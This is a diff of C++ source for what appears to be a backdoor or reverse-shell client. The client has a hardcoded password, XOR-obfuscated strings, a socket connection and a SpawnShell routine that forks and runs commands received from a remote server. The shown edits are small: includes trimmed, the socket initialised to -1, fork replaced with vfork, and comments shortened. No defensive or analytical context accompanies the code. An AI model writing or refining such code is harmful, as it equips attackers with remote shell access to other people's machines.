@@ -1,12 +1,10 @@
 #include<iostream>
 #include<thread>
 #include<string>
-#include<cstring> 		
+#include<cstring>
 #include<csignal>
-#include<unistd.h>			//sleep 
-#include<fcntl.h>
+#include<unistd.h>
 #include<sys/socket.h>
-#include<arpa/inet.h>
 #include<netinet/in.h>
 #include<netdb.h>
 
@@ -14,7 +12,7 @@ class Client{
 	private:
 		std::string strPassword = "$up3rP@sSw0rD";
 	public:
-		int sckSocket;
+		int sckSocket = -1;
 		bool isRunningShell = false;
 		bool Connect(const char*, const char*);
 		void CloseConnection();
@@ -63,7 +61,7 @@ void Client::SpawnShell(const char* cCmdLine){
 		send(sckSocket, strMessage.c_str(), iLen, 0);
 		return;
 	}
-	pid_t pID = fork();
+	pid_t pID = vfork();
 	if(pID == 0){
 		strMessage = Xor(std::string("xx1"));
 		iLen = strMessage.length();
@@ -183,7 +181,7 @@ int main(){
 			Cli->SpawnShell(strCmd.c_str());
 			Cli->CloseConnection();
 		} else {
-			//error receiving command
+			//error
 		}
 	}
 	delete Cli;
